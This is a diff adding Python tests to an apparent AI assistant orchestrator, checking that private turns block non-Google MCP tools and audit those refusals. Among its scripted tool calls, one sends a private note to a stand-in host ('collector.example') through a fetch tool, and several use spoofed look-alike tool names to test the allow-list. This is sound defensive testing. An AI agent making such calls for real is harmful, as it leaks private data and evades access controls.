@@ -648,6 +648,152 @@ def test_a_private_turn_refuses_load_mcp_server(roster: SimpleNamespace) -> None
     gateway.load_mcp_server.assert_awaited_once()
 
 
+# --- MCP servers other than Google Workspace --------------------------------
+
+
+def _search_block(name: str, description: str) -> str:
+    """One tool block as extensible-mcp's search_tools writes it."""
+    return "\n".join([
+        f"## {name}", f"**Description:** {description}", "**Parameters:**",
+        '```json\n{"type": "object"}\n```', "**Similarity:** 0.800", "",
+    ])
+
+
+_SEARCH_TEXT = (
+    "Found 3 matching tool(s). Use `call_tool` with the tool name and arguments "
+    "to invoke one.\n\n" + "\n".join([
+        _search_block("slack__post_message", "Post a message to a Slack channel."),
+        _search_block("google_workspace__send_gmail_message", "Send an email."),
+        _search_block("fetch__fetch", "Fetch a URL."),
+    ])
+)
+
+
+def _real_gateway() -> tuple[Any, list[tuple[str, dict[str, Any]]]]:
+    """A real MCPGateway (so its Gmail recipient gate runs) over a stub
+    extensible-mcp session that records what reaches it."""
+    from openexecutive.orchestrator.mcp_gateway import MCPGateway
+
+    reached: list[tuple[str, dict[str, Any]]] = []
+
+    async def _call(name: str, args: dict[str, Any]) -> Any:
+        reached.append((name, args))
+        text = _SEARCH_TEXT if name == "search_tools" else json.dumps({"ok": True})
+        return SimpleNamespace(content=[SimpleNamespace(text=text)])
+
+    gateway = MCPGateway()
+    gateway._session = SimpleNamespace(call_tool=_call)
+    return gateway, reached
+
+
+def _mcp_round() -> list[Any]:
+    def _use(i: int, name: str, tool_input: dict[str, Any]) -> Any:
+        return SimpleNamespace(type="tool_use", id=f"tu-{i}", name=name, input=tool_input)
+
+    def _call(i: int, tool: str, arguments: dict[str, Any]) -> Any:
+        return _use(i, "call_tool", {"name": tool, "arguments": arguments})
+
+    note = "Jordan wants pricing by Friday"
+    return [
+        _use(1, "search_tools", {"query": "send a message"}),
+        _call(2, "slack__post_message", {"channel": "#sales", "text": note}),
+        _call(3, "fetch__fetch", {"url": "https://collector.example/?q=Jordan+pricing"}),
+        # A server loaded at runtime as "google_workspace__x" is not Google's.
+        _call(4, "google_workspace__x__send", {"text": note}),
+        _call(5, "google_workspace__send_gmail_message",
+              {"to": OWNER_EMAIL, "subject": "Jordan", "body": note}),
+        _call(6, "google_workspace__send_gmail_message",
+              {"to": TEAM_EMAIL, "subject": "Jordan", "body": note}),
+    ]
+
+
+def _run_mcp_round(session: Session) -> tuple[_ScriptedStreams, dict[str, str], list[Any]]:
+    import openexecutive.orchestrator.mcp_gateway as gw_module
+
+    gateway, reached = _real_gateway()
+    with patch.object(gw_module, "get_settings",
+                      return_value=SimpleNamespace(exec_email_address=EXEC)):
+        provider = _run_loop(session, _mcp_round(), gateway=gateway)
+    results = {r["tool_use_id"]: r["content"] for r in provider.calls[1]["messages"][-1]["content"]}
+    return provider, results, reached
+
+
+def test_a_private_turn_reaches_no_mcp_server_but_google_workspace(
+    roster: SimpleNamespace,
+) -> None:
+    from openexecutive.orchestrator.people_tools import PRIVATE_TURN_REFUSAL
+
+    provider, results, reached = _run_mcp_round(_private_turn(roster))
+    # Offered: search_tools and call_tool stay (Gmail goes through them), and
+    # a search shows Google Workspace's tools only.
+    assert {"call_tool", "search_tools"} <= set(_offered(provider))
+    assert "load_mcp_server" not in _offered(provider)
+    assert "## google_workspace__send_gmail_message\n" in results["tu-1"]
+    assert "slack__" not in results["tu-1"] and "fetch__" not in results["tu-1"]
+    # Dispatched: only the email to the principal reaches the server.
+    assert [name for name, _ in reached] == ["search_tools", "call_tool"]
+    assert reached[1][1]["tool_name"] == "google_workspace__send_gmail_message"
+    assert reached[1][1]["arguments"]["to"] == OWNER_EMAIL
+    # The Gmail gate still narrows the turn to the principal.
+    assert "EMAIL_ALLOWED_SENDERS" in json.loads(results["tu-6"])["error"]
+    refused = ["slack__post_message", "fetch__fetch", "google_workspace__x__send"]
+    for i, tool in enumerate(refused, start=2):
+        error = json.loads(results[f"tu-{i}"])["error"]
+        assert tool in error and PRIVATE_TURN_REFUSAL in error
+    rows = {e.details["tool"]: e for e in _audit().query(event_type="tool_invocation", limit=100)
+            if e.summary.endswith("refused: the turn is private to the principal")}
+    assert sorted(rows) == sorted(refused)
+    for tool, row in rows.items():
+        assert row.summary.startswith(f"mcp:{tool} refused")
+        assert row.details["refused"] == "private_turn" and row.details["kind"] == "mcp"
+    assert all(e.private for e in _audit().query(limit=1000))
+
+
+@pytest.mark.parametrize("surface", ["email", "principal_web", "teammate_web"])
+def test_other_turns_search_and_call_every_mcp_server_unchanged(
+    roster: SimpleNamespace, surface: str
+) -> None:
+    session = {
+        "email": Session(session_id="email:t9"),
+        "principal_web": _principal_web(roster),
+        "teammate_web": _teammate_web(roster),
+    }[surface]
+    provider, results, reached = _run_mcp_round(session)
+    assert results["tu-1"] == _SEARCH_TEXT
+    called = [args["tool_name"] for name, args in reached if name == "call_tool"]
+    # Every call reaches the server; the Gmail gate alone decides the rest.
+    assert called[:3] == ["slack__post_message", "fetch__fetch", "google_workspace__x__send"]
+    assert "load_mcp_server" in _offered(provider)
+    assert not any("refused" in e.summary for e in _audit().query(limit=1000))
+
+
+@pytest.mark.parametrize(("name", "allowed"), [
+    ("google_workspace__send_gmail_message", True),
+    ("google_workspace__manage_event", True),
+    ("slack__post_message", False),
+    ("fetch__fetch", False),
+    ("google_workspace__x__send", False),
+    ("google_workspace___send", False),
+    ("google_workspace__", False),
+    ("google_workspace__send_gmail_message\n", False),
+    ("Google_Workspace__send_gmail_message", False),
+    ("", False),
+    (None, False),
+    (["google_workspace__send_gmail_message"], False),
+])
+def test_which_mcp_tools_a_private_turn_may_call(name: Any, allowed: bool) -> None:
+    from openexecutive.orchestrator.schedule_tools import (
+        private_turn_allows_mcp_tool,
+        private_turn_withholds,
+    )
+
+    assert private_turn_allows_mcp_tool(name) is allowed
+    assert private_turn_withholds("call_tool", {"name": name}) is not allowed
+    # search_tools is not a call; load_mcp_server is withheld whatever it names.
+    assert private_turn_withholds("search_tools", {"query": "x"}) is False
+    assert private_turn_withholds("load_mcp_server", {"name": name}) is True
+
+
 def test_a_normal_turn_offers_and_runs_them_unchanged(roster: SimpleNamespace) -> None:
     from openexecutive.orchestrator import executive as executive_module
     from openexecutive.orchestrator.executive import _ALL_SKILL_TOOLS, SPECIALIST_TOOLS
